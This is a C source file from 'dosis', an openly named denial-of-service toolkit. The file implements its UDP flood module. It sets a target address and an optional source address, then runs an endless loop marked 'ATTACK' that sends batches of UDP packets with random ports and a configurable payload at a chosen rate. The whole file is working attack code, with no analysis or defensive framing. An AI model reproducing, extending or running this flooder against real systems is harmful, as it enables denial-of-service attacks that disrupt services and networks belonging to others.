/*****************************************************************************
 * udp.c
 *
 * UDP packet generator.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "tea.h"

typedef struct _tag_UDP_CFG {
  /* parameters */
  TEA_TYPE_ADDR          shost;
  TEA_TYPE_ADDR          dhost;
  TEA_TYPE_INT           npackets;
  TEA_TYPE_FLOAT         hitratio;
  TEA_TYPE_INT           pattern;
  TEA_TYPE_DATA          payload;

  /* other things */
  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
} UDP_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

#if 0
/* the best from performance view is to do nothing */
static int udp__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || IP_PROTOCOL(msg) != 17
  || size < sizeof(struct udphdr) + (IP_HEADER(msg)->ihl << 2))
    return 0;

  /* check msg */
TDBG("[%s]   VEREDICT: %d (%x, %d) [%x, %d]",
     tw->methods->name,
     IP_HEADER(msg)->saddr == tu->dhost.addr.in.addr
     && ntohs(UDP_HEADER(msg)->source) == tu->dhost.port,
     IP_HEADER(msg)->saddr, ntohs(UDP_HEADER(msg)->source),
     tu->dhost.addr.in.addr, tu->dhost.port);
  return IP_HEADER(msg)->saddr == tu->dhost.addr.in.addr
      && ntohs(UDP_HEADER(msg)->source) == tu->dhost.port
         ? -255 : 0;
}
#endif

static void udp__thread(THREAD_WORK *tw)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;
  int i;
  unsigned sport, dport;

  TDBG("Started sender thread");
  sport = dport = 1337;

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tu->hitratio > 0)
      if(pthreadex_timer_wait(&(tu->timer)) < 0)
        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /* build UDP packet with payload (if requested) */
    TDBG("Sending %d packet(s)...", tu->npackets);
    if(tu->shost.port_defined)
      sport = tu->shost.port;
    if(tu->dhost.port_defined)
      dport = tu->dhost.port;
    for(i = 0; i < tu->npackets; i++)
    {
      if(!tu->shost.port_defined)
        ln_get_next_random_port_number(&sport);
      if(!tu->dhost.port_defined)
        ln_get_next_random_port_number(&dport);
      ln_send_udp_packet(tu->lnc,
                         &tu->shost.addr.in.inaddr, sport,
                         &tu->dhost.addr.in.inaddr, dport,
                         tu->payload.data, tu->payload.size);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int udp__configure(THREAD_WORK *tw, SNODE *command)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;

  /* first initialization (specialized work thread data) */
  if(tu == NULL)
  {
    if((tu = calloc(1, sizeof(UDP_CFG))) == NULL)
      TFAT("No memory for UDP_CFG.");
    tw->data = (void *) tu;

    /* initialize libnet */
    TDBG("Initializing libnet.");
    if((tu->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
      TFAT("No memory for LN_CONTEXT.");
    ln_init_context(tu->lnc);

    pthreadex_timer_init(&(tu->timer), 0.0);
  }

  /* check params sanity */
  if(tu->pattern != TYPE_PERIODIC)
    TFAT("Uknown pattern %d.", tu->pattern);
  if(tu->npackets < 0)
    TWRN("Bad number of packets %d.", tu->npackets);
  if(tu->hitratio < 0)
    TFAT("Bad hit ratio '%f'.", tu->hitratio);

  /* configure timer */
  if(tu->hitratio > 0)
    pthreadex_timer_set_frequency(&(tu->timer), tu->hitratio);

  /* configure src address (if not defined) */
  if(tu->dhost.type == INET_FAMILY_NONE)
    TFAT("I need a target address.");
  if(tu->shost.type == INET_FAMILY_NONE)
  {
    DOS_ADDR_INFO *ai;
    if((ai = dos_get_interface(&tu->dhost)) == NULL)
    {
      char buff[255];
      ip_addr_snprintf(&tu->shost, sizeof(buff), buff);
      TWRN("Cannot find a suitable source address for '%s'.", buff);
    } else
      ip_addr_copy(&tu->shost, &ai->addr);
  }

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.n     = %d", tu->npackets);
    TDBG2("config.periodic.ratio = %f", tu->hitratio);

    ip_addr_snprintf(&tu->shost, sizeof(buff)-1, buff);
    TDBG2("config.options.shost  = %s", buff);
    ip_addr_snprintf(&tu->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost  = %s", buff);
  }

  return 0;
}

static void udp__cleanup(THREAD_WORK *tw)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;

  /* collect libnet data */
  ln_destroy_context(tu->lnc);
  free(tu->lnc);
  pthreadex_timer_destroy(&tu->timer);

  if(tu->payload.data)
  {
    free(tu->payload.data);
    tu->payload.data = NULL;
  }
  free(tu);
  tw->data = NULL;

  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * UDP TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaUDP = {
  .name         = "UDP",
  .configure    = udp__configure,
  .cleanup      = udp__cleanup,
/*.listen_check = udp__listen_check,*/
  .thread       = udp__thread,
};

